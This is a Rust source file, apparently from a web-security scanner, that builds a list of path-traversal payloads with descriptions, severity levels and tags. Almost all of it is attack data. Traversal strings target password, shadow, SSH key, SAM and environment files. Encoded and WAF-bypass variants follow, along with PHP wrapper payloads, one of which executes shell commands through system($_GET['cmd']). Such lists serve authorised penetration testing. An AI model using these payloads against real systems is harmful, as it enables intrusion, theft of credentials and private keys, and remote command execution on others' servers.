use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    let basic_traversal = vec![
        ("../", "Basic parent directory", Severity::Medium),
        ("..\\", "Windows parent directory", Severity::Medium),
        ("..%2f", "URL encoded parent", Severity::Medium),
        ("..%5c", "URL encoded Windows parent", Severity::Medium),
        ("..%252f", "Double encoded parent", Severity::Medium),
    ];

    let deep_traversal = vec![
        ("../../", "Two levels up", Severity::High),
        ("../../../", "Three levels up", Severity::High),
        ("../../../../", "Four levels up", Severity::High),
        ("../../../../../", "Six levels up", Severity::High),
        ("../../../../../../", "Seven levels up", Severity::High),
        ("../../../../../../../", "Eight levels up", Severity::High),
        (
            "../../../../../../../../",
            "Nine levels up",
            Severity::Critical,
        ),
        (
            "../../../../../../../../../",
            "Ten levels up",
            Severity::Critical,
        ),
    ];

    let unix_files = vec![
        ("../../../../etc/passwd", "/etc/passwd", Severity::Critical),
        ("../../../../etc/shadow", "/etc/shadow", Severity::Critical),
        ("../../../../etc/hosts", "/etc/hosts", Severity::High),
        (
            "../../../../etc/hostname",
            "/etc/hostname",
            Severity::Medium,
        ),
        (
            "../../../../proc/self/environ",
            "Process environ",
            Severity::Critical,
        ),
        (
            "../../../../proc/self/cmdline",
            "Process cmdline",
            Severity::High,
        ),
        (
            "../../../../proc/self/fd/0",
            "File descriptor 0",
            Severity::High,
        ),
        ("../../../../var/log/auth.log", "Auth log", Severity::High),
        (
            "../../../../var/log/apache2/access.log",
            "Apache access log",
            Severity::High,
        ),
        (
            "../../../../var/log/nginx/access.log",
            "Nginx access log",
            Severity::High,
        ),
        (
            "../../../../home/{user}/.ssh/id_rsa",
            "SSH private key",
            Severity::Critical,
        ),
        (
            "../../../../home/{user}/.bash_history",
            "Bash history",
            Severity::High,
        ),
        (
            "../../../../root/.bash_history",
            "Root bash history",
            Severity::Critical,
        ),
        (
            "../../../../root/.ssh/id_rsa",
            "Root SSH key",
            Severity::Critical,
        ),
        (
            "../../../../etc/mysql/debian.cnf",
            "MySQL debian config",
            Severity::Critical,
        ),
    ];

    let windows_files = vec![
        (
            "..\\..\\..\\windows\\system32\\config\\sam",
            "SAM database",
            Severity::Critical,
        ),
        (
            "..\\..\\..\\windows\\system32\\config\\system",
            "SYSTEM hive",
            Severity::Critical,
        ),
        ("..\\..\\..\\windows\\win.ini", "win.ini", Severity::High),
        (
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "Windows hosts",
            Severity::Medium,
        ),
        (
            "..\\..\\..\\users\\administrator\\desktop\\",
            "Admin desktop",
            Severity::High,
        ),
        (
            "..\\..\\..\\users\\public\\desktop\\",
            "Public desktop",
            Severity::Medium,
        ),
        (
            "..\\..\\..\\windows\\temp\\",
            "Windows temp",
            Severity::Medium,
        ),
        (
            "..\\..\\..\\inetpub\\logs\\logfiles\\",
            "IIS logs",
            Severity::High,
        ),
    ];

    let encoded_variants = vec![
        (
            "..%2f..%2f..%2fetc%2fpasswd",
            "URL encoded /etc/passwd",
            Severity::Critical,
        ),
        (
            "..%252f..%252f..%252fetc%252fpasswd",
            "Double encoded /etc/passwd",
            Severity::Critical,
        ),
        (
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "Overlong UTF-8",
            Severity::High,
        ),
        (
            "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
            "Overlong UTF-8 variant",
            Severity::High,
        ),
        (
            "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam",
            "Double encoded Windows",
            Severity::Critical,
        ),
        (
            "..%u002f..%u002f..%u002fetc/passwd",
            "Unicode escape",
            Severity::High,
        ),
        (
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "Encoded dots",
            Severity::Critical,
        ),
        (
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "Full URL encoding",
            Severity::Critical,
        ),
        ("..%00/etc/passwd", "Null byte bypass", Severity::High),
        ("..%00../../etc/passwd", "Null byte in path", Severity::High),
    ];

    let waf_bypass = vec![
        ("....//", "Double dot bypass", Severity::High),
        ("....//....//", "Double dot deep", Severity::High),
        (
            "....//....//....//etc/passwd",
            "Double dot to passwd",
            Severity::Critical,
        ),
        ("..././", "Triple dot slash", Severity::High),
        (
            "..././..././..././etc/passwd",
            "Triple dot to passwd",
            Severity::Critical,
        ),
        (
            "..//..//..//etc/passwd",
            "Double slash bypass",
            Severity::Critical,
        ),
        (
            "..\\..\\..\\etc/passwd",
            "Mixed slashes Unix",
            Severity::Critical,
        ),
        (
            "../../etc/passwd%00.jpg",
            "Null byte extension",
            Severity::High,
        ),
        ("../../etc/passwd%00.png", "Null byte image", Severity::High),
        (
            "....//....//....//....//etc/passwd",
            "Deep double dot",
            Severity::Critical,
        ),
        ("..../..../..../etc/passwd", "Four dots", Severity::High),
        (
            "..%1n..%1n..%1n/etc/passwd",
            "Unicode newline",
            Severity::Medium,
        ),
    ];

    let wrappers = vec![
        ("file:///etc/passwd", "file:// wrapper", Severity::Critical),
        (
            "file:///c:/windows/system32/config/sam",
            "file:// Windows",
            Severity::Critical,
        ),
        (
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "PHP filter base64",
            Severity::Critical,
        ),
        (
            "php://filter/read=string.rot13/resource=/etc/passwd",
            "PHP filter rot13",
            Severity::High,
        ),
        ("php://input", "PHP input wrapper", Severity::High),
        (
            "php://data://text/plain,<?php system($_GET['cmd']);?>",
            "PHP data wrapper",
            Severity::Critical,
        ),
        (
            "expect://id",
            "Expect wrapper (command)",
            Severity::Critical,
        ),
        (
            "dict://localhost:11211/stats",
            "Dict wrapper",
            Severity::High,
        ),
        (
            "phar:///tmp/archive.tar/a.txt",
            "Phar wrapper",
            Severity::High,
        ),
        (
            "zip://archive.zip#file.txt",
            "Zip wrapper",
            Severity::Medium,
        ),
    ];

    let nginx_specific = vec![
        (
            "..../..../..../..../etc/passwd",
            "Nginx off-by-slash",
            Severity::Critical,
        ),
        ("../../../etc/passwd%00", "Nginx null byte", Severity::High),
    ];

    for (payload, desc, severity) in basic_traversal {
        payloads.push(Payload {
            payload_type: PayloadType::Traversal,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["basic".to_string()],
        });
    }

    for (payload, desc, severity) in deep_traversal {
        payloads.push(Payload {
            payload_type: PayloadType::Traversal,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["deep-traversal".to_string()],
        });
    }

    for (payload, desc, severity) in unix_files {
        payloads.push(Payload {
            payload_type: PayloadType::Traversal,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["unix".to_string(), "file-read".to_string()],
        });
    }

    for (payload, desc, severity) in windows_files {
        payloads.push(Payload {
            payload_type: PayloadType::Traversal,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["windows".to_string(), "file-read".to_string()],
        });
    }

    for (payload, desc, severity) in encoded_variants {
        payloads.push(Payload {
            payload_type: PayloadType::Traversal,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["encoded".to_string()],
        });
    }

    for (payload, desc, severity) in waf_bypass {
        payloads.push(Payload {
            payload_type: PayloadType::Traversal,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["waf-bypass".to_string()],
        });
    }

    for (payload, desc, severity) in wrappers {
        payloads.push(Payload {
            payload_type: PayloadType::Traversal,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["wrapper".to_string(), "php".to_string()],
        });
    }

    for (payload, desc, severity) in nginx_specific {
        payloads.push(Payload {
            payload_type: PayloadType::Traversal,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["nginx".to_string()],
        });
    }

    payloads
}
